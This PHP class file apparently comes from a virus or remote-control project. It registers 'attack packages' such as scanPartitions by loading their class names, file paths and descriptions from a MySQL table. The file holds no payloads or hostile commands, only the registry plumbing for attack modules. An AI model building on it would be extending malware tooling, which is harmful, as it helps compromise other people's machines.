<?php

namespace Kelvinho\Virus\Attack;

/**
 * Class PackageRegistrar, Singleton
 * Oversees the attack packages. They look like scanPartitions, but their real class name with namespace will be Kelvinho\Virus\Attack\Packages\ScanPartitions
 *
 * @package Kelvinho\Virus\Attack
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class PackageRegistrar {
    private array $packages = [];
    private array $packageNames = [];

    /**
     * PackageRegistrar constructor.
     * @param \mysqli $mysqli
     * @param string $codeRoot The code root, aka the one that will be mounted to document root
     */
    public function __construct(\mysqli $mysqli, string $codeRoot) {
        $result = $mysqli->query("select * from packageInfo");
        if (!$result) throw new PackageInfoNotFound();
        while ($row = $result->fetch_assoc()) {
            $this->packages[$row["package_name"]] = array("className" => $row["class_name"], "displayName" => $row["display_name"], "location" => "$codeRoot/model/Attack/Packages/" . $row["location"], "description" => $row["description"]);
            array_push($this->packageNames, $row["package_name"]);
        }
    }

    /**
     * Get array of packages db names
     *
     * @return array
     */
    public function getPackages(): array {
        return $this->packageNames;
    }

    /**
     * Whether a package is available
     *
     * @param string $dbName Name of package stored in the database
     * @return bool
     */
    public function hasPackage(string $dbName): bool {
        return isset($this->packages[$dbName]);
    }

    /**
     * Gets the package's display name
     *
     * @param string $dbName Name of package stored in the database
     * @return string The package display name
     */
    public function getDisplayName(string $dbName): string {
        return $this->packages[$dbName]["displayName"];
    }

    /**
     * Gets the package's description
     *
     * @param string $dbName The package name
     * @return string The package description
     */
    public function getDescription(string $dbName): string {
        return $this->packages[$dbName]["description"];
    }

    /**
     * Convert the package name (like scanPartitions) to the actual class name (like Kelvinho\Virus\Attack\Packages\ScanPartitions).
     * This is used for reflection and to create new attack objects easily.
     *
     * @param string $dbName The package name
     * @return string The actual class name
     */
    public function getClassName(string $dbName) {
        return $this->packages[$dbName]["className"];
    }

    /**
     * Gets the package's description. This is used for rendering the page
     *
     * @param string $dbName The package name
     * @return string The package description
     */
    public function getLocation(string $dbName) {
        return $this->packages[$dbName]["location"];
    }
}
